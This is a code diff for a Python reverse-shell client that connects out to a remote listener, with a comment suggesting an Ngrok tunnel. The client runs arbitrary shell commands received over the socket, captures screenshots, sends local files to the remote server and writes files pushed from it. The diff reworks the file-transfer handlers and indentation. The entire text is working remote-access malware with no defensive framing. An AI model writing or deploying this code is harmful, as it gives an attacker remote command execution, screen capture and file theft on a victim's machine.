@@ -4,34 +4,37 @@ from PIL import ImageGrab
 import os
 
 def connect_to_listener(host, port):
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((host, port))
+	global client
+	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	client.connect((host, port))
 
-    while True:
-        command = client.recv(4096).decode()
+	while True:
+		command = client.recv(4096).decode()
 
-        if command.lower() == "exit":
-            break
+		if command.lower() == "exit":
+			break
 
-        if command.lower() == "screenshot":
-            send_screenshot(client)
-        elif command.lower() == "upload":
-            send_files(client)
-        elif command.lower() == "download":
-            client.send(command.encode())
-            download_file(client)
-        elif command.lower().startswith("cd"):
-            location = command[3::]
-            if os.path.exists(location):
-                os.chdir(location)
-                client.send("Done ...".encode())
-            else:
-                client.send("This Location Not Found".encode())
-        else:
-            output = subprocess.getoutput(command)
-            client.send(output.encode())
+		if command.lower() == "screenshot":
+			send_screenshot(client)
+		elif command[:8].lower() == "download":
+			upload_file(command[9:])
+		elif command[:6].lower()=="upload":
+			download_file()
+		elif command.lower().startswith("cd "):
+			try:
+				os.chdir(command[3:])
+				client.send(b"CHANGED_DIR")
+			except:
+				client.send(b"DIR_NOT_FOUND")
+		else:
+			output = subprocess.getoutput(command)
+			if len(output) == 0:
+				client.send(b" ")
+			else:
+				client.send(output.encode())
 
-    client.close()
+
+	client.close()
 
 def send_screenshot(client):
     screenshot = ImageGrab.grab()
@@ -46,44 +49,39 @@ def send_screenshot(client):
     client.send(b"DONE")
     print("[*] 🖼️ Screenshot sent")
 
-def send_files(client):
-    file_paths = input("💾 Enter the file path(s) to upload (separated by spaces): ").split()
 
-    client.send(str(len(file_paths)).encode())
+def upload_file(file_name):
+			if not os.path.exists(file_name):
+				client.send(b"FILE_NOT_FOUND")
+				return
+			client.send(b"SENDING_FILES")
+			f = open(file_name, "rb")
+			client.send(f.read())
+			print("[*] Sent File To Server")
 
-    for file_path in file_paths:
-        if os.path.isfile(file_path):
-            client.send(file_path.encode())
 
-            with open(file_path, "rb") as file:
-                data = file.read(4096)
-                while data:
-                    client.send(data)
-                    data = file.read(4096)
 
-            client.send(b"DONE")
-            print(f"[*] File '{os.path.basename(file_path)}' uploaded successfully")
-        else:
-            print(f"[!] File '{file_path}' does not exist")
-
-def download_file(client):
-    file_name = input("💾 Enter the file name to download: ")
-    client.send(file_name.encode())
-
-    response = client.recv(4096).decode()
-    if response == "FILE_NOT_FOUND":
-        print("[!] File not found on the remote machine")
-    else:
-        with open(file_name, "wb") as file:
-            while True:
-                data = client.recv(4096)
-                if data == b"DONE":
-                    break
-                file.write(data)
-
-        print(f"[*] 📥 File '{file_name}' downloaded successfully")
+def download_file():
+			data = client.recv(1024).decode()
+			if data == "FILE_NOT_CHOSE":
+				return
+			repets = client.recv(1024).decode()
+			for _ in range(int(repets)):
+				file_name = client.recv(1024).decode()
+				f = open(file_name, "wb")
+				client.settimeout(1)
+				chunk = client.recv(1024)
+				while chunk:
+					f.write(chunk)
+					try:
+						chunk = client.recv(1024)
+					except socket.timeout as e:
+						break
+				client.settimeout(None)
+				f.close()
+				print("[*] File Recived From Server")
 
 if __name__ == "__main__":
-    host = "host"  # Replace with your Ngrok tunnel URL
-    port = 1234  # Replace with your listener's port number
-    connect_to_listener(host, port)
+	host = "localhost"  # Replace with your Ngrok tunnel URL
+	port = 1234  # Replace with your listener's port number
+	connect_to_listener(host, port)
